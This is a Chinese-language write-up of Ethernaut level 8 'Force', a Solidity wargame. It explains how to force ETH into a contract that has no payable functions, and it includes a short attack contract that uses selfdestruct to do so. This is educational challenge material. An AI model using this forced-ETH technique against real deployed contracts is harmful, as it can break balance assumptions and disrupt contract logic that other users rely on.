---
title: Ethernaut 闯关笔记 第8关 Force
date: 2023-12-13 00:29:46
tags:
---

# 原始代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

# 攻击思路

因为该合约没有任何 `payable` 函数，也没有 `receive()` 函数，因此不能直接发送交易。

强制调用合约代码，可以使用另一个合约的 `selfdestruct()` 关键字。

每一个合约都可以通过 `selfdestruct(address)` 关键字实现自毁，并将剩余的 ETH 余额发送到指定的地址。

注意，ERC-20 代币余额并不会被发送，自毁后这些代币将会永久丢失。

# 攻击代码

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceHack{

    function destroy(address forceAddress) public {
        selfdestruct(payable(forceAddress));
    }

    receive() payable external{}
}
```

# 冷知识

`selfdestruct` 已被标记为 `deprecated` ，在 [EIP-4758](https://eips.ethereum.org/EIPS/eip-4758) 中被废除并将其 opcode 修改为 `SENDALL` 。

`SENDALL` 只发送全部的 ETH 余额，但不会删除合约的 bytecode 。

